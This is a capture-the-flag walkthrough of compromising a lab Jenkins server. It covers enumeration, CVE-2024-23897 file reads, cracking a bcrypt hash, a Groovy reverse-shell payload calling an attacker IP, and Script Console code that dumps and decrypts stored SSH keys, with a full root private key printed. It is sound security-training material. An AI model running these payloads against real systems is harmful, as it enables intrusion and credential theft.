## Reconnaissance
- Nmap scans :
```
nmap -sV -sC -vv -p- 10.10.11.10
nmap -sU --top-ports=10 -vv 10.10.11.10

---OUTPUT-TCP---
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
8080/tcp open  http    syn-ack ttl 62 Jetty 10.0.18
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(10.0.18)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Dashboard [Jenkins]
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-----

---OUTPUT-UDP---
PORT     STATE         SERVICE      REASON
67/udp   open|filtered dhcps        no-response
161/udp  open|filtered snmp         no-response
```
- TCP:
- Linux OS
- 8080 tcp port (Jetty 10.0.18?, Jenkins Dashboard)
- UDP:
- SNMP port open
- Website : access 10.10.11.10:8080
- Jenkins Dashboard
- REST API leads to /api/
- Jenkins version 2.441
- searchsploit reveals a vulnerability but we google to understand it as the python file does not explain.
- CVE-2024-23897
- People > userid : jennifer
- On refreshing I also find userid "anonymous"
- Credentials > System > Global Credentials > root with SSH private key
- Sign-in page
- Directory Enumeration
- ffuf reveals nothing
- gobuster:
```bash
gobuster dir -u http://builder.htb:8080/ dns --wordlist /usr/share/wordlists/dirb/common.txt

---OUTPUT---
/404                  (Status: 200) [Size: 8581]
/about                (Status: 302) [Size: 0] [--> http://builder.htb:8080/about/]
/api                  (Status: 302) [Size: 0] [--> http://builder.htb:8080/api/]
/assets               (Status: 302) [Size: 0] [--> http://builder.htb:8080/assets/]
/computers            (Status: 302) [Size: 0] [--> http://builder.htb:8080/computers/]
/computer             (Status: 302) [Size: 0] [--> http://builder.htb:8080/computer/]
/configure            (Status: 403) [Size: 628]
/error                (Status: 400) [Size: 8354]
/exit                 (Status: 405) [Size: 8745]
/favicon.ico          (Status: 200) [Size: 17542]
/index                (Status: 200) [Size: 14982]
/log                  (Status: 403) [Size: 595]
/login                (Status: 200) [Size: 2220]
/logout               (Status: 302) [Size: 0] [--> http://builder.htb:8080/]
/main                 (Status: 500) [Size: 8619]
/manage               (Status: 302) [Size: 0] [--> http://builder.htb:8080/manage/]
/me                   (Status: 403) [Size: 593]
/people               (Status: 302) [Size: 0] [--> http://builder.htb:8080/people/]
/properties           (Status: 302) [Size: 0] [--> http://builder.htb:8080/properties/]
/queue                (Status: 302) [Size: 0] [--> http://builder.htb:8080/queue/]
/robots.txt           (Status: 200) [Size: 71]
/search               (Status: 302) [Size: 0] [--> http://builder.htb:8080/search/]
/script               (Status: 403) [Size: 601]
/secured              (Status: 401) [Size: 0]
/timeline             (Status: 302) [Size: 0] [--> http://builder.htb:8080/timeline/]
/widgets              (Status: 302) [Size: 0] [--> http://builder.htb:8080/widgets/]
```
- robots.txt :
```bash
# we don't want robots to click "build" links
User-agent: *
Disallow: /
```
- /api/
- dirsearch :
```bash
dirsearch -u http://builder.htb:8080

---OUTPUT---
[19:21:40] 200 -    3KB - /404                                              
[19:21:42] 400 -  556B  - /;login/                                               
[19:21:42] 400 -  556B  - /;admin/                                          
[19:21:49] 302 -    0B  - /about  ->  http://builder.htb:8080/about/       
[19:22:11] 400 -  556B  - /admin;/                                          
[19:22:46] 302 -    0B  - /api  ->  http://builder.htb:8080/api/            
[19:22:46] 200 -    5KB - /api/                                             
[19:22:53] 302 -    0B  - /assets  ->  http://builder.htb:8080/assets/      
[19:22:54] 200 -    5KB - /asynchPeople/                                    
[19:23:16] 200 -    6KB - /cli/                                            
[19:23:21] 200 -  237B  - /config.xml                                            
[19:23:24] 303 -    0B  - /console/j_security_check  ->  http://builder.htb:8080/loginError
[19:23:28] 302 -    0B  - /credentials  ->  http://builder.htb:8080/credentials/
[19:24:15] 303 -    0B  - /j_security_check  ->  http://builder.htb:8080/loginError
[19:24:28] 302 -    0B  - /logout  ->  http://builder.htb:8080/             
[19:24:28] 302 -    0B  - /logout/  ->  http://builder.htb:8080/
[19:24:30] 500 -    3KB - /main                                             
[19:24:30] 302 -    0B  - /manage  ->  http://builder.htb:8080/manage/      
[19:24:56] 302 -    0B  - /people  ->  http://builder.htb:8080/people/      
[19:25:15] 302 -    0B  - /properties  ->  http://builder.htb:8080/properties/
/script/jqueryplugins/dataTables/extras/TableTools/media/swf/ZeroClipboard.swf 
                                    
[19:25:28] 302 -    0B  - /search  ->  http://builder.htb:8080/search/      

```
- /assets/
- /cli/
- trying some of those pages leads to some jenkins error so maybe accessible after logging in
- from searchsploit I tried the downloaded exploit:
```bash
python3 51993.py -u http://builder.htb:8080 -p /etc/passwd | grep "sh"

---OUTPUT---
root:x:0:0:root:/root:/bin/bash
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
```
- It works and we get the user jenkins home directory, so we grab users.txt
```bash
python3 51993.py -u http://builder.htb:8080 -p /var/jenkins_home/user.txt

---OUTPUT---
7c4babe70d59c7023df217f486de8f48
```
- We search online for finding users for jenkins web application. We find that it stores information in XML format.
- https://jenkins-le-guide-complet.github.io/html/sec-hudson-home-directory-contents.html
- says theres a user directory. 
```bash
python3 51993.py -u http://builder.htb:8080 -p /var/jenkins_home/users/users.xml

---OUTPUT---
<?xml version='1.1' encoding='UTF-8'?>
      <string>jennifer_12108429903186576833</string>
  <idToDirectoryNameMap class="concurrent-hash-map">
    <entry>
      <string>jennifer</string>
  <version>1</version>
</hudson.model.UserIdMapper>
  </idToDirectoryNameMap>
<hudson.model.UserIdMapper>
    </entry>
```
- We check the config.xml of jennifer_12108429903186576833
```bash
python3 51993.py -u http://builder.htb:8080 -p /var/jenkins_home/users/jennifer_12108429903186576833/config.xml

---OUTPUT---
<passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>
```
- Hash : $2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a
- We crack it with John The Ripper tool
```bash
vi hash # Copy hash
OR
touch hash
echo "$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a" > hash
----
john hash --wordlist=/usr/share/wordlists/rockyou.txt
----

---OUTPUT---
princess         (?)
```
- We login to web application with these credentials.
- I found :
- http://10.10.11.10:8080/manage/script
- can execute groovy script where i searched online and found a script
```bash
String host="10.10.14.25";
int port=9999;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
- I ran this script with netcat listening and got a reverse shell.
- I made a proper shell:
```bash
script /dev/null -c bash
```
- In the home directory when we pass `ls -la` we find
- secret.key
- credentials.xml
- This file reveals a private key of root but when copying it to try and ssh into as root, so it implies this could be an encrypted private key.
- On searching online for ways to decrypt it i came across some:
- AI code
- https://www.reddit.com/r/jenkinsci/comments/16oqqak/ssh_keys_in_manage_credentials_or_global/
- https://gist.github.com/hoto/d1c874480888f8711f12db33a20b6e4d
- We pass this in the script region 
- Manage Jenkins > Script Console
- http://10.10.11.10:8080/manage/script
- Manage Jenkins also shows plugins where we can check that the ssh plugin is installed for storing ssh credentials
------
- private key command (AI):
```bash
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.domains.Domain
import com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl
import com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey
import jenkins.model.Jenkins

def creds = Jenkins.instance.getExtensionList('com.cloudbees.plugins.credentials.SystemCredentialsProvider')[0].getStore().getCredentials(Domain.global())
creds.each { c ->
    if (c instanceof BasicSSHUserPrivateKey) {
        println "ID: ${c.id}"
        println "Username: ${c.username}"
        println "Private Key: \n${c.getPrivateKey()}"
    }
}

```
- The script is based on Jenkins' internal Groovy APIs, primarily from:
- Jenkins Credentials Plugin API – It allows fetching stored credentials from Jenkins.
- com.cloudbees.plugins.credentials.SystemCredentialsProvider provides access to stored credentials.
- BasicSSHUserPrivateKey is the specific class for SSH private keys.
- Jenkins Instance Methods
- Jenkins.instance.getExtensionList() is commonly used to access system-wide configurations.
- Decryption API (hudson.util.Secret)
- Secret.decrypt() is Jenkins' built-in function for decrypting stored secrets (like passwords and keys).
- Experience and Prior Research
- Similar methods have been used in Jenkins privilege escalation, pentesting reports, and public research.
- Or from this link :
- test
```bash
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,Jenkins.instance,null,null
);
for (c in creds) {
  if (c instanceof com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey) {
    println(String.format("id=%s\nuser=%s\npassphrase=%s\nkey=\n%s\n", c.id, c.username, c.passphrase, c.privateKeySource.getPrivateKey()))
  }
}
```
- Or this command **Ideal as it shows what function is being used to decrypt the key which is hudson.util.Secret.decrypt**
```bash
hashed_pw='{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}'
passwd = hudson.util.Secret.decrypt(hashed_pw)
println(passwd)
```
- Gives private key :
```bash
ID: 1
Username: root
Private Key: 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

Result: [com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey@31]
```
- we ssh into machine as root user with this private key
```bash
vi id_rsa # copy the private key
chmod 0600 id_rsa
ssh -i id_rsa root@builder.htb
```
